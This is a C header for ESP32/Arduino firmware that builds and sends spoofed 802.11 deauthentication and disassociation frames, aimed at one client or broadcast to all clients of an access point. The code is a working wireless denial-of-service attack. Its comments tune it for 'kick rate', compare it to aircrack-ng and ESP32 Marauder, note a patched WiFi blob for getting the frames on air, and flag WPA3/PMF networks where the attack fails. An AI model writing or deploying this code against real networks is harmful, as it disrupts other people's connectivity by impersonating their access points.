/*
 * wifi_deauth_frame — shared 802.11 deauth/disassoc frame builder.
 *
 * Addressing follows the 802.11-2016 mgmt frame layout:
 *   addr1 = destination (either broadcast FF:FF:...FF or the client STA MAC)
 *   addr2 = transmitter / BSSID being impersonated
 *   addr3 = BSSID
 *
 * Every invocation fires a deauth (subtype 0xC0, reason 7) *and* a disassoc
 * (subtype 0xA0, reason 8). This mirrors aircrack-ng `--deauth`, ESP32
 * Marauder, and Ghost ESP — some client drivers ignore deauth but honor
 * disassoc, and vice versa. Sending the pair improves kick rate against a
 * wider range of targets.
 *
 * The sequence number is caller-owned and incremented per frame. A static
 * zero sequence number causes some APs and modern client drivers to treat
 * every frame as a duplicate of the previous one — they rate-limit or drop.
 *
 * esp_wifi_80211_tx is called with en_sys_seq=false so the sequence we
 * stamp is the one that goes on air. If a patched WiFi blob is present
 * (see docs/deauth-injection-patch.md) the frames leave the chip as
 * written. On stock IDF some frames may be dropped at the TX FIFO —
 * return value tracks actual sends.
 *
 * Returns: number of frames the driver accepted (0, 1, or 2).
 */
#pragma once

#include <Arduino.h>
#include <esp_wifi.h>
#include <string.h>

static inline void _deauth_stamp_seq(uint8_t *f, uint16_t seq)
{
    uint16_t s = seq & 0x0FFF;
    /* Seq Control = (SeqNum << 4) | FragNum, little-endian */
    f[22] = (uint8_t)((s & 0x000F) << 4);
    f[23] = (uint8_t)((s >> 4) & 0xFF);
}

/*
 * Fire one deauth + one disassoc at `dst` spoofed from `bssid`.
 * `seq` is a caller-owned counter, incremented twice (once per frame).
 */
static inline int wifi_deauth_pair(const uint8_t dst[6],
                                   const uint8_t bssid[6],
                                   uint16_t *seq)
{
    uint8_t f[26];
    /* Frame Control */
    f[0] = 0xC0;  /* type=mgmt, subtype=deauth */
    f[1] = 0x00;
    /* Duration */
    f[2] = 0x3A; /* 58us — borrowed from aircrack-ng default */
    f[3] = 0x01;
    /* Addresses */
    memcpy(f + 4,  dst,   6);
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
    /* Sequence */
    _deauth_stamp_seq(f, (*seq)++);
    /* Reason code 7: class 3 frame received from nonassociated STA */
    f[24] = 0x07;
    f[25] = 0x00;

    int ok = 0;
    if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false) == ESP_OK) ok++;

    /* Same frame, different subtype + reason = disassoc pair. */
    f[0] = 0xA0;  /* subtype=disassoc */
    _deauth_stamp_seq(f, (*seq)++);
    f[24] = 0x08;  /* reason 8: disassociated due to inactivity */
    f[25] = 0x00;

    if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false) == ESP_OK) ok++;
    return ok;
}

/*
 * One broadcast pair targeting every STA associated to `bssid`.
 */
static inline int wifi_deauth_broadcast(const uint8_t bssid[6], uint16_t *seq)
{
    static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return wifi_deauth_pair(BCAST, bssid, seq);
}

/*
 * PMF/WPA3 hint. Returns true if the auth mode is known to use Protected
 * Management Frames — in which case plain deauth/disassoc is
 * cryptographically dropped and this attack won't land.
 *
 * `auth` comes from ap_t.auth which is `(uint8_t)WiFi.encryptionType(i)`.
 * The numeric values are stable across IDF versions: WPA3_PSK=6,
 * WPA2_WPA3_PSK=7, ENTERPRISE(WPA2-Ent)=5, WPA3_ENT_192=10.
 */
static inline bool wifi_auth_has_pmf(uint8_t auth)
{
    /* PMF-mandatory or PMF-capable auth modes. Numeric values match
     * wifi_auth_mode_t across IDF 4.x / 5.x. */
    switch (auth) {
        case 5:   /* WIFI_AUTH_ENTERPRISE (WPA2-Enterprise) */
        case 6:   /* WIFI_AUTH_WPA3_PSK */
        case 7:   /* WIFI_AUTH_WPA2_WPA3_PSK — WPA3-transition, PMF required */
        case 10:  /* WIFI_AUTH_WPA3_ENT_192 */
        case 11:  /* WIFI_AUTH_WPA3_EXT_PSK */
        case 12:  /* WIFI_AUTH_WPA3_EXT_PSK_MIXED_MODE */
            return true;
        default:
            return false;
    }
}
